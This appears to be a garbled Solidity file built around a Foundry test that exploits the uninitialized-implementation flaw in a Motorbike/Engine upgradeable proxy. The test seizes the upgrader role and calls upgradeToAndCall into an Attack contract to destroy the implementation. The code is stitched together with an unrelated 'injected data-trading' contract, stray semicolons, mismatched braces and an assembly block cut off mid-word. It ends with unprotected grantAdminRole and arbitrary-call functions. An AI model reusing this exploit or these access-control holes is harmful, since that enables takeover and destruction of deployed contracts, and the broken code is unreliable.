
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.15;

;
;
;
contract ContractTest is Test {
    Engine EngineContract;
    Motorbike MotorbikeContract;
    Attack AttackContract;
    address alice = vm.addr(1);
    address eve = vm.addr(2);
    function testSafeMint() public {
        EngineContract = new Engine();
        MotorbikeContract = new Motorbike(address(EngineContract));
        AttackContract = new Attack();
        console.log("Unintialized Upgrader:", EngineContract.upgrader());
        address(EngineContract).call(abi.encodeWithSignature("initialize()"));
        console.log("Initialized Upgrader:", EngineContract.upgrader());
        bytes memory initEncoded = abi.encodeWithSignature("attack()");
        address(EngineContract).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(AttackContract), initEncoded));
        console.log("Exploit completed");
        console.log("Since EngineContract destroyed, next call will fail.");
        address(EngineContract).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(AttackContract), initEncoded))};
contract Motorbike {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    struct AddressSlot {
        address value};
    constructor(address _logic) {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed")};
    function _delegate(address implementation) internal virtual {
        assembly {
            cal
function duplicateSubmission(bytes memory signedData) public {
    externalContract.call(signedData)}
function grantAdminRole(address user) public {
    admins[user] = true}